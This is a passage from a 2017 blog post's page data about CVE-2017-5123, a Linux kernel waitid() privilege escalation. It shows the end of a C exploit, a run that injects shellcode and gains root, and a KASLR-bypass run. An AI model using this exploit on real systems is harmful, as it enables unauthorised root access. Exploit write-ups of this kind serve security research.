EXIT_FAILURE<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  pid <span class=\"token operator\">=</span> <span class=\"token function\">fork</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// Trigger</span>\n\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>pid <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token function\">get_shell</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> EXIT_SUCCESS<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token operator\">/</span> $ id\nuid<span class=\"token operator\">=</span><span class=\"token number\">1001</span><span class=\"token punctuation\">(</span>zero<span class=\"token punctuation\">)</span> gid<span class=\"token operator\">=</span><span class=\"token number\">1001</span><span class=\"token punctuation\">(</span>zero<span class=\"token punctuation\">)</span> groups<span class=\"token operator\">=</span><span class=\"token number\">1001</span><span class=\"token punctuation\">(</span>zero<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">/</span> $ <span class=\"token punctuation\">.</span><span class=\"token operator\">/</span>exp <span class=\"token number\">0xffffffff81000000</span> <span class=\"token number\">0</span>\n<span class=\"token punctuation\">[</span><span class=\"token operator\">*</span><span class=\"token punctuation\">]</span> Kernel Version <span class=\"token operator\">:</span> <span class=\"token number\">4.14</span><span class=\"token number\">.0</span><span class=\"token operator\">-</span>rc4<span class=\"token operator\">+</span>\n<span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">]</span> Kernel Base           <span class=\"token operator\">:</span> <span class=\"token number\">0xffffffff81000000</span>\n<span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">]</span> prepare_kernel_cred   <span class=\"token operator\">:</span> <span class=\"token number\">0xffffffff810753d0</span>\n<span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">]</span> commit_creds          <span class=\"token operator\">:</span> <span class=\"token number\">0xffffffff81075050</span>\n<span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">]</span> have_canfork_callback <span class=\"token operator\">:</span> <span class=\"token number\">0xffffffff81f3f45a</span>\n<span class=\"token punctuation\">[</span><span class=\"token operator\">*</span><span class=\"token punctuation\">]</span> Stage <span class=\"token number\">1</span> <span class=\"token operator\">-</span> Try to allocate <span class=\"token number\">0x0</span>\n<span class=\"token punctuation\">[</span><span class=\"token operator\">*</span><span class=\"token punctuation\">]</span> Stage <span class=\"token number\">2</span> <span class=\"token operator\">-</span> Inject shellcode\n<span class=\"token punctuation\">[</span><span class=\"token operator\">*</span><span class=\"token punctuation\">]</span> Stage <span class=\"token number\">3</span> <span class=\"token operator\">-</span> Trigger <span class=\"token function\">waitid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">/</span> # id\nuid<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> gid<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span></code></pre></div>\n<p>[+] Plus</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">zero@ubuntu<span class=\"token operator\">:</span><span class=\"token operator\">~</span><span class=\"token operator\">/</span>Desktop<span class=\"token operator\">/</span>kaslr_bypass$ <span class=\"token punctuation\">.</span><span class=\"token operator\">/</span>exp <span class=\"token number\">0</span>\n<span class=\"token punctuation\">[</span><span class=\"token operator\">*</span><span class=\"token punctuation\">]</span> Kernel Version <span class=\"token operator\">:</span> <span class=\"token number\">4.13</span><span class=\"token number\">.4</span><span class=\"token operator\">-</span><span class=\"token number\">041304</span><span class=\"token operator\">-</span>generic\n<span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">]</span> Kernel Base           <span class=\"token operator\">:</span> <span class=\"token number\">0xffffffffa0a00000</span>\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\nzero@ubuntu<span class=\"token operator\">:</span><span class=\"token operator\">~</span><span class=\"token operator\">/</span>Desktop<span class=\"token operator\">/</span>kaslr_bypass$ sudo cat <span class=\"token operator\">/</span>proc<span class=\"token operator\">/</span>kallsyms <span class=\"token operator\">|</span> grep _text <span class=\"token operator\">|</span> head <span class=\"token operator\">-</span>n <span class=\"token number\">1</span>\nffffffffa0a00000 T _text</code></pre></div>\n<p><strong>End</strong></p>","excerpt":"Linux Kernel waitid() Local Privilege Escalation TL;DR Some days ago, i just saw this vulnerability somewhere in google. It's about Kernel …","tableOfContents":"<ul>\n<li>\n<p><a href=\"#tldr\">TL;DR</a></p>\n</li>\n<li>\n<p><a href=\"#1---day-vulnerability--cve-2017-5123\">1 - day vulnerability : CVE-2017-5123</a></p>\n</li>\n<li>\n<p><a href=\"#before\">Before</a></p>\n</li>\n<li>\n<p><a href=\"#after\">After</a></p>\n</li>\n<li>\n<p><a href=\"#payload-analysis\">Payload Analysis</a></p>\n</li>\n<li>\n<p><a href=\"#but\">But...</a></p>\n<ul>\n<li><a href=\"#1-kaslr-bypass\">1. KASLR Bypass</a></li>\n<li><a href=\"#2-mmap_min_addr-is-set-to-0\">2. mmap_min_addr is set to 0</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#then\">Then...?</a></p>\n</li>\n<li>\n<p><a href=\"#conclusion\">Conclusion</a></p>\n</li>\n</ul>","fields":{"slug":"/CVE-2017-5123/"},"frontmatter":{"title":"LK v4.13.x - waitid() LPE","date":"Oct 29, 2017","tags":["Security","Linux-Kernel"],"keywords":["1-day"],"update":"Oct 29, 2017"},"timeToRead":30}},"pageContext":{"slug":"/CVE-2017-5123/","series":[],"lastmod":"2017-10-29"}},"staticQueryHashes":["2027115977","2744905544","694178885"]}